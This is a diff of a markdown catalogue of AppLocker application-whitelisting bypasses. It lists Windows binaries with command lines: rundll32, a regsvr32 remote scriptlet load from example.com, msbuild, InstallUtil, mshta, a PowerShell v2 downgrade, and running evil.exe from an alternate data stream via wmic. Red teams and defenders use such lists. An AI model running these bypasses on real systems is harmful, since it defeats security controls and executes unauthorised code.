@@ -29,16 +29,18 @@ Please contribute and do point out errors or resources I have forgotten.
 
 `rundll32 shell32.dll,Control_RunDLL payload.dll`
 
-Requires admin: No  
-Windows binary: Yes  
-Bypasses AppLocker Default rules: No  
+* Requires admin: No  
+* Windows binary: Yes  
+* Bypasses AppLocker Default rules: No  
 
-Notes:
+* Notes:
+I only tested on Windows 10 against the default rules, it could work against older Windows versions.
 
-Links:  
-https://pentestlab.blog/2017/05/23/applocker-bypass-rundll32/
-https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_7
-https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/Rundll32.md
+* Links:  
+  * https://pentestlab.blog/2017/05/23/applocker-bypass-rundll32/
+  * https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_7
+  * https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/Rundll32.md
+  * https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/
 
 
 
@@ -46,15 +48,16 @@ https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/Run
 
 `regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll`
 
-Requires admin: No  
-Windows binary: Yes  
-Bypasses AppLocker Default rules: No  
+* Requires admin: No  
+* Windows binary: Yes  
+* Bypasses AppLocker Default rules: No  
 
-Notes: 
+*Notes: 
+I only tested on Windows 10 against the default rules, it could work against older Windows versions.
 
-Links:  
-https://gist.github.com/subTee/24c7d8e1ff0f5602092f58cbb3f7d302
-https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/Regsvr32.md
+* Links:  
+  * https://gist.github.com/subTee/24c7d8e1ff0f5602092f58cbb3f7d302
+  * https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/Regsvr32.md
 
 
 
@@ -62,20 +65,21 @@ https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/Reg
 
 `msbuild.exe pshell.xml`
 
-Requires admin: No  
-Windows binary: Yes  
-Bypasses AppLocker Default rules: Yes  
+* Requires admin: No  
+* Windows binary: Yes  
+* Bypasses AppLocker Default rules: Yes  
 
-Notes:
+* Notes:
 
-Links:  
-https://gist.github.com/subTee/6b236083da2fd6ddff216e434f257614
-http://subt0x10.blogspot.no/2017/04/bypassing-application-whitelisting.html
-https://github.com/Cn33liz/MSBuildShell
-https://github.com/Cn33liz/MS17-012
-https://pentestlab.blog/2017/05/29/applocker-bypass-msbuild/
-https://www.youtube.com/watch?v=aSDEAPXaz28
-https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/Trusted_Developer_Utilities.md
+* Links:  
+  * https://gist.github.com/subTee/6b236083da2fd6ddff216e434f257614
+  * http://subt0x10.blogspot.no/2017/04/bypassing-application-whitelisting.html
+  * https://github.com/Cn33liz/MSBuildShell
+  * https://github.com/Cn33liz/MS17-012
+  * https://pentestlab.blog/2017/05/29/applocker-bypass-msbuild/
+  * https://www.youtube.com/watch?v=aSDEAPXaz28
+  * https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/Trusted_Developer_Utilities.md
+  * https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/
 
 
 
@@ -84,16 +88,17 @@ https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/Tru
 `regsvcs.exe /U regsvcs.dll`
 `regsvcs.exe regsvcs.dll`
 
-Requires admin: No  
-Windows binary: Yes  
-Bypasses AppLocker Default rules: No  
+* Requires admin: No  
+* Windows binary: Yes  
+* Bypasses AppLocker Default rules: Yes  
 
-Notes:
+* Notes:
 
-Links:  
-https://pentestlab.blog/2017/05/19/applocker-bypass-regasm-and-regsvcs/
-https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Payloads/RegSvcsRegAsmBypass.cs
-https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/RegsvcsRegasm.md
+* Links:  
+  * https://pentestlab.blog/2017/05/19/applocker-bypass-regasm-and-regsvcs/
+  * https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Payloads/RegSvcsRegAsmBypass.cs
+  * https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/RegsvcsRegasm.md
+  * https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/
 
 
 
@@ -102,34 +107,34 @@ https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/Reg
 `regasm.exe /U regsvcs.dll`
 `regasm.exe regsvcs.dll`
 
-Requires admin: /U does not require admin  
-Windows binary: Yes  
-Bypasses AppLocker Default rules: No  
+* Requires admin: /U does not require admin  
+* Windows binary: Yes  
+* Bypasses AppLocker Default rules: Yes   
 
-Notes:
+* Notes:
 
-Links:  
-https://pentestlab.blog/2017/05/19/applocker-bypass-regasm-and-regsvcs/
-https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Payloads/RegSvcsRegAsmBypass.cs
-https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/RegsvcsRegasm.md
-
+* Links:  
+  * https://pentestlab.blog/2017/05/19/applocker-bypass-regasm-and-regsvcs/
+  * https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Payloads/RegSvcsRegAsmBypass.cs
+  * https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/RegsvcsRegasm.md
+  * https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/
 
 
 ## 6. Bginfo.exe
 
 `bginfo.exe bginfo.bgi /popup /nolicprompt`
 
-Requires admin: No  
-Windows binary: No  
-Bypasses AppLocker Default rules: No  
+* Requires admin: No  
+* Windows binary: No  
+* Bypasses AppLocker Default rules: No  
 
-Notes:
+* Notes:
+Will work if BGinfo.exe is located in a path that is trusted by the policy.
 
-
-Links:  
-https://msitpros.com/?p=3831
-https://pentestlab.blog/2017/06/05/applocker-bypass-bginfo/
-https://msitpros.com/?p=3860
+* Links:  
+  * https://oddvar.moe/2017/05/18/bypassing-application-whitelisting-with-bginfo/
+  * https://oddvar.moe/2017/05/22/clarification-bginfo-4-22-applocker-still-vulnerable/
+  * https://pentestlab.blog/2017/06/05/applocker-bypass-bginfo/
 
 
 
@@ -137,18 +142,20 @@ https://msitpros.com/?p=3860
 
 `InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll`
 
-Requires admin: No  
-Windows binary: Yes  
-Bypasses AppLocker Default rules: No  
+* Requires admin: No  
+* Windows binary: Yes  
+* Bypasses AppLocker Default rules: Yes  
 
-Notes:
+* Notes:
 
-Links:  
-https://github.com/subTee/AllTheThings
-https://pentestlab.blog/2017/05/08/applocker-bypass-installutil/
-https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_12
-http://subt0x10.blogspot.no/2017/09/banned-file-execution-via.html
-https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/InstallUtil.md
+* Links:  
+  * https://github.com/subTee/AllTheThings 
+  * https://pentestlab.blog/2017/05/08/applocker-bypass-installutil/ 
+  * https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_12 
+  * http://subt0x10.blogspot.no/2017/09/banned-file-execution-via.html 
+  * https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/InstallUtil.md 
+  * https://www.blackhillsinfosec.com/powershell-without-powershell-how-to-bypass-application-whitelisting-environment-restrictions-av/ 
+  * https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/
 
 
 
@@ -156,14 +163,15 @@ https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/Ins
 
 `Open .diagcab package`
 
-Requires admin: No  
-Windows binary: Yes  
-Bypasses AppLocker Default rules: ?  
+* Requires admin: No  
+* Windows binary: Yes  
+* Bypasses AppLocker Default rules: ?  
 
-Notes:
+* Notes:
 
-Links:  
-https://cybersyndicates.com/2015/10/a-no-bull-guide-to-malicious-windows-trouble-shooting-packs-and-application-whitelist-bypass/
+* Links:  
+  * https://cybersyndicates.com/2015/10/a-no-bull-guide-to-malicious-windows-trouble-shooting-packs-and-application-whitelist-bypass/
+  * https://oddvar.moe/2017/12/21/applocker-case-study-how-insecure-is-it-really-part-2/
 
 
 
@@ -171,14 +179,15 @@ https://cybersyndicates.com/2015/10/a-no-bull-guide-to-malicious-windows-trouble
 
 `mshta.exe evilfile.hta`
 
-Requires admin: No  
-Windows binary: Yes  
-Bypasses AppLocker Default rules: Yes  
+* Requires admin: No  
+* Windows binary: Yes  
+* Bypasses AppLocker Default rules: Yes  
 
-Notes:
+* Notes:
 
-Links:  
-https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_4
+* Links:  
+  * https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_4
+  * https://oddvar.moe/2017/12/21/applocker-case-study-how-insecure-is-it-really-part-2/
 
 
 
@@ -186,14 +195,15 @@ https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_4
 
 `cmd.exe /k < script.txt`
 
-Requires admin: No  
-Windows binary: Yes  
-Bypasses AppLocker Default rules: No    
+* Requires admin: No  
+* Windows binary: Yes  
+* Bypasses AppLocker Default rules: No    
 
-Notes:
+* Notes:
 
-Links:  
-https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_3
+* Links:  
+  * https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_3
+  * https://oddvar.moe/2017/12/21/applocker-case-study-how-insecure-is-it-really-part-2/
 
 
 
@@ -201,14 +211,15 @@ https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_3
 
 `Get-Content script.txt | iex`
 
-Requires admin: No  
-Windows binary: Yes  
-Bypasses AppLocker Default rules: No  
+* Requires admin: No  
+* Windows binary: Yes  
+* Bypasses AppLocker Default rules: No  
 
-Notes:
+* Notes:
 
-Links:  
-https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_3
+* Links:  
+  * https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_3
+  * https://oddvar.moe/2017/12/21/applocker-case-study-how-insecure-is-it-really-part-2/
 
 
 
@@ -216,31 +227,30 @@ https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_3
 
 `cscript.exe //E:vbscript script.txt`
 
-Requires admin: No  
-Windows binary: Yes  
-Bypasses AppLocker Default rules: No  
+* Requires admin: No  
+* Windows binary: Yes  
+* Bypasses AppLocker Default rules: No  
 
-Notes:
+* Notes:
 
-Links:  
-https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_3
-
+* Links:  
+  * https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_3
+  * https://oddvar.moe/2017/12/21/applocker-case-study-how-insecure-is-it-really-part-2/
 
 
 ## 13. PresentationHost.exe
 
 Missing Example
 
-Requires admin: No  
-Windows binary: Yes  
-Bypasses AppLocker Default rules: ?  
+* Requires admin: No  
+* Windows binary: Yes  
+* Bypasses AppLocker Default rules: ?  
 
+* Notes:
 
-Notes:
-
-Links:  
-https://github.com/api0cradle/ShmooCon-2015/blob/master/ShmooCon-2015-Simple-WLEvasion.pdf
-
+* Links:  
+  * https://github.com/api0cradle/ShmooCon-2015/blob/master/ShmooCon-2015-Simple-WLEvasion.pdf
+  * https://oddvar.moe/2017/12/21/applocker-case-study-how-insecure-is-it-really-part-2/
 
 
 ## 14. dfsvc.exe
@@ -609,10 +619,12 @@ Windows binary: Yes
 Bypasses AppLocker Default rules: ?  
 
 Notes:
+Only works on Windows 7? Windows 10 requires admin or digital signature
 
 Links:
 https://twitter.com/KyleHanslovan/status/911997635455852544
 https://gist.github.com/KyleHanslovan/5e0f00d331984c1fb5be32c40f3b265a
+https://blog.conscioushacker.io/index.php/2017/10/25/evading-microsofts-autoruns/
 
 
 
@@ -675,3 +687,56 @@ Notes:
 .WSF files are supposed to not be blocked by AppLocker
 
 Links:
+
+
+
+## 42. PowerShell version 2
+
+`Powershell -version 2`
+
+Requires admin: No  
+Windows binary: Yes  
+Bypasses AppLocker Default rules: ?  
+
+Notes:
+Bypasses Constrained language mode
+
+Links:
+
+
+
+## 43. CL_Invocation.ps1
+
+`. C:\Windows\diagnostics\system\AERO\CL_Invocation.ps1`
+`SyncInvoke <executable> [args]`
+
+Requires admin: No  
+Windows binary: Yes  
+Bypasses AppLocker Default rules: Yes, as long as PowerShell version 2 is present  
+
+Notes:
+Requires PowerShell version 2
+
+Links:
+https://twitter.com/bohops/status/948548812561436672
+
+
+
+## 44. Incorrect permissions on files in folders
+
+'''
+type C:\temp\evil.exe > "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"
+
+wmic process call create '"C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"'
+'''
+
+* Requires admin: No  
+* Windows binary: Yes  
+* Bypasses AppLocker Default rules: Yes
+
+* Notes:
+
+
+* Links:
+  * https://twitter.com/Oddvarmoe/status/951757732557852673
+
